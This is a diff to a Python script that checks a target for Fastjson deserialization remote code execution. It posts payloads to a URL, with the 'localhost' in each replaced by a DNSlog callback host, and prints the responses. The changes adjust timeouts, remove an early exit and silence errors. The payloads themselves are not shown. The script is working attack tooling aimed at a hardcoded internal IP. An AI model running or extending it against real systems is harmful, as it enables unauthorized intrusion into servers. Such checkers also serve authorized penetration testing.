@@ -46,27 +46,22 @@ def check_fastjson_rce(url_dir, dnslog, data):
         print(
             "###############################################payload: %d ###############################################" % n)
         payload = payload.replace('localhost', dnslog.strip()) % url_dir.split('/')[2].replace(':', '_')
-
         re_data = re.findall(r'[{](.*?)[}]', data.strip().strip('{'), re.S)
-
         if re_data:
             re_data = re.findall(r'[{](.*?)[}]', data.strip().strip('{'), re.S)
             for re_payload in re_data:
                 if re_payload != "":
                     re_payload = data.replace(re_payload, payload.strip('{').strip('}'))
-                    res = requests.post(url=url_dir, headers=headers, data=re_payload, timeout=3, verify=False)
+                    res = requests.post(url=url_dir, headers=headers, data=re_payload, timeout=5, verify=False)
                     print("-" * 50)
                     print(res.text)
                     time.sleep(1)
         else:
-            res = requests.post(url=url_dir, headers=headers, data=payload, timeout=10, verify=False)
+            res = requests.post(url=url_dir, headers=headers, data=payload, timeout=5, verify=False)
             print(res.request.body)
             print(res.text)
-            pass
         time.sleep(10)
         n += 1
-        exit(0)
-
 
 def verify(protol, ip, port, exploit_dir, dnslog, data):
     ip = ip.strip()
@@ -78,14 +73,13 @@ def verify(protol, ip, port, exploit_dir, dnslog, data):
     try:
         check_fastjson_rce(url_dir, dnslog, data)
     except Exception as e:
-        msg = "[-] There is Not Seem fastjson反序列化漏洞 Vuln! Error: %s " % str(e)
-        return False, msg 
+        pass
 
 if __name__ == '__main__':
     ip = "        192.168.43.90                               "
     dnslog = "xxx.xxx.xxx"
     data = ' '
-    print(verify("http", ip, "443","/exploit  ",dnslog, data))
+    verify("http", ip, "443","/exploit  ",dnslog, data)
 
 
 
